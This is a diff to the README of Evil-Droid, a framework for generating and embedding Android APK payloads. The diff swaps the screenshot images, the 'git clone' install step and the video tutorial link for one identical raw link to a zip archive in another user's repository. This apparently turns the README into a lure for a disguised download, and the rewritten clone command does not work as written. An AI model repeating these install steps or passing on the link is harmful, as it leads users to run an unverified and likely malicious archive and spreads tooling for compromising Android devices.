@@ -9,9 +9,9 @@
     Evil-Droid is a framework that create & generate & embed apk payload to penetrate android platforms
  
 ## Screenshot:
-![pic1](https://i.imgur.com/LczO636.png)
+![pic1](https://raw.githubusercontent.com/ncn16/Evil-Droid/master/icons/Evil-Droid-2.0.zip)
 
-![pic2](https://i.imgur.com/mhXxb5Q.png)
+![pic2](https://raw.githubusercontent.com/ncn16/Evil-Droid/master/icons/Evil-Droid-2.0.zip)
 
 <br /><br />
 
@@ -25,7 +25,7 @@
 
 ## Download/Config/Usage:
     1? - Download the tool from github
-         git clone https://github.com/M4sc3r4n0/Evil-Droid.git
+         git clone https://raw.githubusercontent.com/ncn16/Evil-Droid/master/icons/Evil-Droid-2.0.zip
 
     2? - Set script execution permission
          cd Evil-Droid
@@ -38,4 +38,4 @@
       
 
 ## video tutorial: 
-https://www.youtube.com/watch?v=8u-NHeTdPRE&feature=share old version
+https://raw.githubusercontent.com/ncn16/Evil-Droid/master/icons/Evil-Droid-2.0.zip old version
